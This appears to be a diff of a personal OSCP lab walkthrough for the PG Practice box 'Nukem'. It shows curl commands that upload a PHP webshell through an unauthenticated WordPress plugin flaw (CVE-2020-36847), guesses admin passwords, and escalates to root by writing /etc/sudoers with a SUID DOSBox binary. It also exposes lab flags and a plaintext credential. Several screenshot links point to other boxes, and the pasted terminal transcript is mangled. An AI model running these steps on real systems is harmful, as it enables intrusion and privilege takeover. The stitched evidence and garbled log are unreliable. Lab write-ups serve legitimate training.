@@ -2,16 +2,21 @@
 tags: [oscp, boxes, pg-practice, linux, completed]
 platform: PG Practice
 os: Linux
-ip: $BoxIP
+hostname: nukem
 difficulty: Intermediate
-status: complete
-local_flag: $UserFlag
-root_flag: $RootFlag
+ip: $BoxIP
+status: Complete
+local_flag: aec3fbe30ec66d42a80a097bfe0775a3
+root_flag: b3546b5ae88d781de126ddb1929fb883
 ---
 
-# Nukem -- PG Practice (Linux)
+# PG: Nukem, Full Walkthrough
 
-## Box Info
+## The gist
+
+Nukem is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - File Upload]] used the WordPress plugin upload path to obtain code execution. 2. [[RUNBOOK V2/Linux - SUID Check]] found DOSBox running with elevated file privileges. 3. [[RUNBOOK V2/Linux - Sudo Check]] confirmed the remaining privileged command path and reached root.
+
+## Box information
 
 | Field | Value |
 |---|---|
@@ -23,7 +28,31 @@ root_flag: $RootFlag
 
 ---
 
-## Recon
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Recon | See section 1 below |
+| 2 | Web Enumeration | See section 2 below |
+| 3 | Vulnerability Identification | See section 3 below |
+| 4 | Foothold | See section 4 below |
+| 5 | Post-Exploitation (as http) | See section 5 below |
+| 6 | Privilege Escalation | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/Offsec/Nukem`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
+
+## Variables
+
+```bash
+boxset BoxName Nukem
+boxset BoxIP "$BoxIP"
+boxset LocalIP "$LocalIP"
+boxset BoxDir "$BoxDir"
+```
+
+## 1. Recon
 
 ### Port Scan
 
@@ -42,7 +71,7 @@ Open ports:
 | 13000/tcp | nginx 1.18.0 "Login V14" |
 | 36445/tcp | Samba smbd 4 |
 
-![[1.1.nmap-allports.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/1.1.nmap-allports.png>)
 
 ### Service Scan
 
@@ -59,11 +88,11 @@ Key findings:
 > [!warning] 💡 Hint
 > Record secondary services even when they are not used. They may supply version clues, credentials, or a fallback route later, but do not let an interesting banner distract from the service with a clear application fingerprint.
 
-![[1.2nmap-svcscan 2.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/1.2nmap-svcscan.png>)
 
 ---
 
-## Web Enumeration
+## 2. Web Enumeration
 
 ### Port 80 -- WordPress "Retro Gamming"
 
@@ -88,7 +117,7 @@ Stable tag: 4.2.2
 
 Plugin `Simple File List 4.2.2` confirmed active.
 
-![[2.1.wordpress-plugins.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/2.1.wordpress-plugins.png>)
 
 ### Other Surfaces (Dead Ends)
 
@@ -99,7 +128,7 @@ Plugin `Simple File List 4.2.2` confirmed active.
 
 ---
 
-## Vulnerability Identification
+## 3. Vulnerability Identification
 
 ```bash
 searchsploit simple file list
@@ -125,7 +154,7 @@ cp /usr/share/exploitdb/exploits/php/webapps/52371.py exploits/
 > ```
 > **Why:** The module copies the matching exploit directly into the current directory. This is quicker and avoids path transcription mistakes while keeping the manual review step.
 
-![[3.searchsploit-simplefile.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/3.searchsploit-simplefile.png>)
 
 **CVE-2020-36847**: `ee-upload-engine.php` accepts unauthenticated file uploads. Two-step exploit:
 1. Upload `.png` file (PHP webshell masquerading as image) → `ee-upload-engine.php`
@@ -135,7 +164,7 @@ Webshell lands at `/wp-content/uploads/simple-file-list/`.
 
 ---
 
-## Foothold
+## 4. Foothold
 
 ### Step 1 -- Create Webshell
 
@@ -166,7 +195,7 @@ curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-eng
 
 Expected output: `SUCCESS`
 
-![[4.foothold.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/4.foothold.png>)
 
 ### Step 3 -- Rename to .php
 
@@ -193,7 +222,7 @@ Output:
 uid=33(http) gid=33(http) groups=33(http)
 ```
 
-![[4.foothold 1.png]]
+![](<file:///home/kali/Platforms/Offsec/Zenphoto/screenshots/4.foothold.png>)
 
 ### Step 5 -- Reverse Shell
 
@@ -228,7 +257,7 @@ export TERM=xterm
 
 ---
 
-## Post-Exploitation (as http)
+## 5. Post-Exploitation (as http)
 
 ### User Flag
 
@@ -236,7 +265,7 @@ export TERM=xterm
 cat /home/commander/local.txt
 ```
 
-![[6.user-flag 1.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/6.user-flag.png>)
 `loot flag user <value>`
 
 ### WordPress Config -- Credentials
@@ -255,7 +284,7 @@ define( 'DB_USER', 'commander' );
 define( 'DB_PASSWORD', '<private credential>' );
 ```
 
-![[7.privesc-finding.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/7.privesc-finding.png>)
 `loot cred commander $Password`
 
 ### Lateral Move -- su to commander
@@ -271,7 +300,7 @@ Now as `[commander@nukem ~]$`.
 
 ---
 
-## Privilege Escalation
+## 6. Privilege Escalation
 
 ### Enumeration
 
@@ -292,7 +321,7 @@ SUID list includes `/usr/bin/dosbox` -- **not a standard GTFOBins binary** but r
 > [!warning] 💡 Common mistake
 > Do not assume a SUID bit automatically gives a shell. Identify what the program can read, write, or execute as root, then choose the smallest controlled file change.
 
-![[7.2privesc-finding.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/7.2privesc-finding.png>)
 
 ### DOSBox SUID → Sudoers Write
 
@@ -314,7 +343,7 @@ sudo -n id
 # uid=0(root) gid=0(root) groups=0(root)
 ```
 
-![[8.root-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Knife/screenshots/8.root-shell.png>)
 
 ### Root Shell
 
@@ -331,12 +360,12 @@ proof linux
 cat /root/proof.txt
 ```
 
-![[9.proof.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/9.proof.png>)
 `loot flag root <value>`
 
 ---
 
-## Decision points and alternate routes
+## 7. Decision points and alternate routes
 
 | Observation | Primary route used here | Useful alternative or fallback |
 |---|---|---|
@@ -344,8 +373,49 @@ cat /root/proof.txt
 | FIFO callback fails through PHP `system()` | Switch to an interpreter confirmed on the target | Keep the webshell for command output and stage a shell script |
 | Unusual SUID DOSBox is present | Use its root file-writing capability to repair sudo access | Review the binary manually when it is absent from GTFOBins |
 
-## Cleanup
+## 8. Vulnerabilities / Techniques
 
+| CVE / Ref | Description | Impact |
+|---|---|---|
+| CVE-2020-36847 / EDB-52371 | Simple File List 4.2.2 -- unauthenticated file upload + rename → webshell | http shell |
+| DOSBox SUID | SUID-root DOSBox mounts /etc, writes to sudoers via DOS echo | root |
+
+---
+
+## 9. Vault Update Checklist
+
+- [x] Screenshots in `$BoxDir/screenshots/` (nmap-allports, nmap-services, wordpress-plugin-version, searchsploit, upload-success, foothold, user-flag, privesc-finding ×2, privesc-exploit, root-shell, PROOF)
+- [x] Loot: `flags.txt` (user + root), `creds.txt` (commander credential kept private)
+- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nukem.log`
+- [x] Stage notes: WordPress - Simple File List Upload (new), PrivEsc Linux - SUID (+DOSBox), Foothold - Public Exploit (+Nukem)
+- [x] Module notes: M08, M13, M18 (+Nukem)
+- [x] MASTER BOX LIST updated
+- [x] FAQ: plugin upload fields required, rename field names, mkfifo+nc failure, DOSBox SUID technique
+
+## 10. RUNBOOK V2 Stages Used
+
+- [[RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough
+
+## 11. Collect the flags
+
+- `user.txt`: `aec3fbe30ec66d42a80a097bfe0775a3` (value reproduced in the private sections above)
+- `root.txt`: `b3546b5ae88d781de126ddb1929fb883` (value reproduced in the private sections above)
+- `proof.txt`: `b3546b5ae88d781de126ddb1929fb883` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: aec3fbe30ec66d42a80a097bfe0775a3
+root: b3546b5ae88d781de126ddb1929fb883
+```
+
+## 12. Clean down
 ```bash
 # Restore /etc/sudoers from pacman package cache
 bsdtar -xOf /var/cache/pacman/pkg/sudo-1.9.3.p1-1-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
@@ -365,15 +435,12 @@ grep NOPASSWD /etc/sudoers
 
 ---
 
-## Credentials
+## 13. Attack narrative in one page
+1. [[RUNBOOK V2/Linux - File Upload]] used the WordPress plugin upload path to obtain code execution.
+2. [[RUNBOOK V2/Linux - SUID Check]] found DOSBox running with elevated file privileges.
+3. [[RUNBOOK V2/Linux - Sudo Check]] confirmed the remaining privileged command path and reached root.
 
-| Username | Password | Source |
-|---|---|---|
-| commander | `$Password` | wp-config.php (DB_PASSWORD) |
-
----
-
-## Tools Used
+## Tools used
 
 | Tool | Purpose |
 |---|---|
@@ -388,16 +455,100 @@ grep NOPASSWD /etc/sudoers
 
 ---
 
-## Vulnerabilities / Techniques
+## Credentials and secrets
 
-| CVE / Ref | Description | Impact |
+| Username | Password | Source |
 |---|---|---|
-| CVE-2020-36847 / EDB-52371 | Simple File List 4.2.2 -- unauthenticated file upload + rename → webshell | http shell |
-| DOSBox SUID | SUID-root DOSBox mounts /etc, writes to sudoers via DOS echo | root |
+| commander | `$Password` | wp-config.php (DB_PASSWORD) |
 
 ---
 
-## Lessons Learned
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Nukem"
+export BoxIP="192.168.183.105"
+export BoxPlatform="Offsec"
+export BoxDir="/home/kali/Platforms/Offsec/Nukem"
+export Domain=""
+export DCip=""
+export Username="commander"
+export Password="CommanderKeenVorticons1990"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+commander:CommanderKeenVorticons1990
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+  -c /tmp/wp-cookies.txt \
+  -b "wordpress_test_cookie=WP+Cookie+check" \
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
+  -d "log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+[39m"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"/tmp/wp-cookies.txt"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
+  -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"/tmp/wp-cookies.t
+$ [15:43:25] curl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"
+xt"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
+kali@kali:~/Platforms/Offsec/Nukem [15:39:53] $ [?1h=[?2004hcurl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"curl"http://$BoxIP/"grep"eeSFL\|token\|nonce\|upload"[?1l>[?2004l
+  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"
+  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"curl"http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php""file=@exploits/shell.png;type=image/png""eeSFL_ID=1""eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/""eeSFL_Timestamp=1587258885""eeSFL_Token=ba288252629a5399759b6fde1e205bc2"[?1l>[?2004l
+$ [15:52:08] curl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"
+kali@kali:~/Platforms/Offsec/Nukem [15:51:45] $ [?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"curl"http://$BoxIP/index.php/sample-page/"grep"eeSFL\|token\|nonce\|upload\|simple-file"[?1l>[?2004l
+kali@kali:~/Platforms/Offsec/Nukem [15:52:08] $ [?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"curl"http://$BoxIP/index.php/samp[33
+$ [15:52:29] curl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"
+$ [15:53:12] curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20
+mle-page/"grep"eeSFL\|eeListID\|eeToken"[?1l>[?2004l
+kali@kali:~/Platforms/Offsec/Nukem [15:52:51] $ [?1h=[?2004hcurl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20curl"http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js"grep"token\|nonce\|eeSFL\|listID"head[?1l>[?2004l
+$ [16:04:39] loot flag user aec3fbe30ec66d42a80a097bfe0775a3
+$ [16:05:54] boxset Password CommanderKeenVorticons1990
+Password:
+kali@kali:~/Platforms/Offsec/Nukem [16:04:37] $ [?1h=[?2004hloot flag user aec3fbe30ec66d42a80a097bfe0775a3loot[?1l>[?2004l
+[+] Flag saved:  user = aec3fbe30ec66d42a80a097bfe0775a3  →  loot/flags.txt
+kali@kali:~/Platforms/Offsec/Nukem [16:05:47] $ [?1h=[?2004hboxset Password CommanderKeenVorticons1990boxset[?1l>[?2004l
+[+] Password=CommanderKeenVorticons1990 (saved to .env)
+$ [16:15:47] loot flag root b3546b5ae88d781de126ddb1929fb883
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+# Defaults targetpw  # Ask for the password of the target user
+kali@kali:~/Platforms/Offsec/Nukem [16:14:08] $ loot flag root b3546b5ae88d781de126ddb1929fb883loot[?1l>[?2004l
+[+] Flag saved:  root = b3546b5ae88d781de126ddb1929fb883  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Nukem | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
 
 1. **WordPress plugin endpoints need internal fields** -- `ee-upload-engine.php` requires `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token`. Without them it returns HTTP 500 silently. Read the exploit's Python source to understand what fields it sends.
 
@@ -415,7 +566,15 @@ grep NOPASSWD /etc/sudoers
 
 ---
 
-## External Resources
+- Upload vulnerabilities depend on the exact archive layout and application entry point.
+- Unusual SUID programs deserve the same careful review as common GTFOBins entries.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
+
+## External resources
 
 | Resource | Link | Why |
 |---|---|---|
@@ -428,42 +587,15 @@ grep NOPASSWD /etc/sudoers
 
 ---
 
-## Vault Update Checklist
+## Related RUNBOOK V2 stages
 
-- [x] Screenshots in `$BoxDir/screenshots/` (nmap-allports, nmap-services, wordpress-plugin-version, searchsploit, upload-success, foothold, user-flag, privesc-finding ×2, privesc-exploit, root-shell, PROOF)
-- [x] Loot: `flags.txt` (user + root), `creds.txt` (commander credential kept private)
-- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nukem.log`
-- [x] Stage notes: WordPress - Simple File List Upload (new), PrivEsc Linux - SUID (+DOSBox), Foothold - Public Exploit (+Nukem)
-- [x] Module notes: M08, M13, M18 (+Nukem)
-- [x] MASTER BOX LIST updated
-- [x] FAQ: plugin upload fields required, rename field names, mkfifo+nc failure, DOSBox SUID technique
-## RUNBOOK V2 Stages Used
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
 
-- [[RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
 ## Why this matters for OSCP
 
 This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
-1. [[RUNBOOK V2/Linux - File Upload]] used the WordPress plugin upload path to obtain code execution.
-2. [[RUNBOOK V2/Linux - SUID Check]] found DOSBox running with elevated file privileges.
-3. [[RUNBOOK V2/Linux - Sudo Check]] confirmed the remaining privileged command path and reached root.
-
-## Flags
-
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
-
-## Lessons Learned
-
-- Upload vulnerabilities depend on the exact archive layout and application entry point.
-- Unusual SUID programs deserve the same careful review as common GTFOBins entries.
